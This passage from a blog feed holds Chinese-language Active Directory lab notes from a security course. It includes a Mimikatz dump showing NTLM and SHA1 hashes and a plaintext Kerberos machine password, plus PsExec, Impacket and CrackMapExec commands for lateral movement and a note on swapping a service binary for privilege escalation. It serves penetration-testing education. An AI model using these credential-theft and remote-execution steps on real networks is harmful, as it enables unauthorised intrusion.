&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-90-0-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">996&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e4&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : desktop-g95u93t$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">47346&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b8f2&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : UMFD-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Font Driver Host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-96-0-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">46297&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b4d9&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : UMFD-0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Font Driver Host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-96-0-0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">44132&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000ac64&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : UndefinedLogonType from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:37
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">999&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e7&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : UndefinedLogonType from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:37
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : desktop-g95u93t$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::
可以看到這一份檔案比前面提到的SAM還要完整很多，用log的原因是他會把輸出dump下來，用熟悉的文字編輯器尋找有用的資訊比較方便，另外，==Privilege::Debug==的意思是跟windows取得debug lsass的權限&lt;/li>
&lt;/ol></description></item><item><title>NTUSTISC - AD Note - Lab(遠端執行(RDP))</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/</guid><description>&lt;h1 id="ntustisc---ad-note---lab遠端執行rdp">
 NTUSTISC - AD Note - Lab(遠端執行(RDP))
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e9%81%a0%e7%ab%af%e5%9f%b7%e8%a1%8crdp">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/ubNMQ7_dcm0?si=26g2Lz2CB-O-7S5d"> 2022/05/11 AD 安全 2 &lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E7%BB%88%E7%94%A8%E6%88%B7%E8%AE%B8%E5%8F%AF%E5%8D%8F%E8%AE%AE">What is EULA?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>終端使用者授權合約（英語：end-user license agreements，英文縮寫：EULA）是指軟體的開發者或發行者授權使用者使用特定軟體產品時的規定，大多私有軟體附帶此合約，如不接受則無法安裝。不過自由軟體則較少使用這個合約&lt;/p>&lt;/blockquote>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;p>此Lab主要是要讓我們可以遠端執行其他人的電腦，當我們已經取得local admin時，但domain admin遲遲沒有出現，我們就需要多找幾台主機試看看，可不可以登入或是遠端連線，這樣從一台主機出發，多幾台主機一起蹲domain admin的機會就會變大，可能會有疑問，要怎麼知道其他電腦的密碼呢?如果這一間公司它沒有使用之前介紹過的&lt;a href="https://learn.microsoft.com/zh-tw/windows-server/identity/laps/laps-overview">LAPS密碼管理工具&lt;/a>，而且又是委外管理，則很有可能會有多台主機的密碼都一樣，然後再用前面提到的多種密碼提取方法(Brute Force SAM/Password Spraying etc)，得到更多台主機的密碼，然後再利用Mimikatz之類的工具把lsass的info leak出來，就有可能得到domain admin的密碼&lt;/p>
&lt;h3 id="遠端執行rdp">
 ==遠端執行(RDP)==
 &lt;a class="anchor" href="#%e9%81%a0%e7%ab%af%e5%9f%b7%e8%a1%8crdp">#&lt;/a>
&lt;/h3>
&lt;h4 id="linux--kali">
 Linux / Kali
 &lt;a class="anchor" href="#linux--kali">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>Tools
&lt;ul>
&lt;li>xfreerdp
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install freerdp2-x11 -y
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Libfreerdp
先到&lt;a href="https://packages.debian.org/sid/libfreerdp-client2-2">https://packages.debian.org/sid/libfreerdp-client2-2&lt;/a>這個頁面看一下要下載哪一個版本，Kali是amd64
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cd ~/Downloads
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ wget http://ftp.tw.debian.org/debian/pool/main/f/freerdp2/libfreerdp-client2-2_2.10.0+dfsg1-1.1_amd64.deb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h4 id="windows">
 Windows
 &lt;a class="anchor" href="#windows">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>Tools: &lt;a href="https://learn.microsoft.com/zh-tw/sysinternals/downloads/psexec">Psexec.exe&lt;/a>
微軟的遠端執行工具，具有微軟的簽章，第一次使用需要接受EULA
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ PsExec.exe -i &lt;span style="color:#ae81ff">\\&lt;/span>&amp;lt;Remote IP&amp;gt; -accepteula -u &lt;span style="color:#f92672">[&lt;/span>&amp;lt;domain&amp;gt;&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#ae81ff">\&amp;lt;&lt;/span>Remote Username&amp;gt; -p &amp;lt;Remote Password&amp;gt; cmd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h5 id="how-to-use-xfreerdp">
 ==How to use xfreerdp==
 &lt;a class="anchor" href="#how-to-use-xfreerdp">#&lt;/a>
&lt;/h5>
&lt;p>網路上有很多文章和教學&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>，不過他們的情況和我們的狀況有點不一樣
:::success
使用條件：Win2016一定要打開，事先取得帳號的密碼
:::&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(遠端執行(RDP)2)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/</guid><description>&lt;h1 id="ntustisc---ad-note---lab遠端執行rdp2">
 NTUSTISC - AD Note - Lab(遠端執行(RDP)2)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e9%81%a0%e7%ab%af%e5%9f%b7%e8%a1%8crdp2">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/ubNMQ7_dcm0?si=26g2Lz2CB-O-7S5d"> 2022/05/11 AD 安全 2 &lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/Byk16MV0n">NTUSTISC - AD Note - Lab(Password Spraying)&lt;/a>
&lt;a href="https://sectools.tw/impacket/">滲透測試的利器 - Impacket&lt;/a>:&lt;/p>
&lt;blockquote>
&lt;p>python撰寫的內網滲透工具&lt;/p>&lt;/blockquote>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="遠端執行rdp2">
 ==遠端執行(RDP)2==
 &lt;a class="anchor" href="#%e9%81%a0%e7%ab%af%e5%9f%b7%e8%a1%8crdp2">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Kali-Linux Tools
&lt;ul>
&lt;li>Impacket(Kali-Linux愛好者可使用的PsExec)
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Set up &amp;amp; Install&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/fortra/impacket.git
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cd impacket
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ conda activate py3.7 &lt;span style="color:#75715e"># Recommended to install it in conda&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ pip3 install -r requirements.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python3 setup.py install
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Cheat-Sheet&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ conda activate py3.7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ proxychains psexec.py &amp;lt;username&amp;gt;:&amp;lt;password&amp;gt;@&amp;lt;ip&amp;gt; whoami
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>CrackMapExec
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ crackmapexec smb &lt;span style="color:#f92672">[&lt;/span>IP&lt;span style="color:#f92672">]&lt;/span> -u &amp;lt;username&amp;gt; -p &amp;lt;password --exec-method smbexec -x &lt;span style="color:#e6db74">&amp;#39;&amp;lt;command&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>exec-method支援以下方法:
* mmcexec
* smbexec
* wmiexec
* atexec&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h4 id="how-to-use-impacket">
 ==How to use Impacket==
 &lt;a class="anchor" href="#how-to-use-impacket">#&lt;/a>
&lt;/h4>
&lt;p>感覺應該是proxychains壞掉了，或是有一些其他問題，導致Connection Refused，總而言之，這套工具就是讓kali-linux也可以使用psexec這個工具&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(錯誤配置)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/</guid><description>&lt;h1 id="ntustisc---ad-note---lab錯誤配置">
 NTUSTISC - AD Note - Lab(錯誤配置)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e9%8c%af%e8%aa%a4%e9%85%8d%e7%bd%ae">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=M0LV3dBCMCOy58LN&amp;amp;t=3600">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>提權方法
&lt;ul>
&lt;li>利用弱點&lt;/li>
&lt;li>Hijack Token&lt;/li>
&lt;li>Guess Password&lt;/li>
&lt;li>管理服務&lt;/li>
&lt;li>錯誤配置
&lt;ul>
&lt;li>服務使用高權限執行且檔案權限配置錯誤，所以只要把這項服務替換成惡意程式，最後再利用前面提到的print operator重開機，就可以達到控制的目的&lt;/li>
&lt;li>透過&lt;a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk.exe&lt;/a>找出有問題的地方
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ accesschk.exe &amp;lt;user&amp;gt; &amp;lt;path&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>For example
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ accesschk.exe &amp;#34;Administrator&amp;#34; &amp;#34;C:\Program Files\&amp;#34;

Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
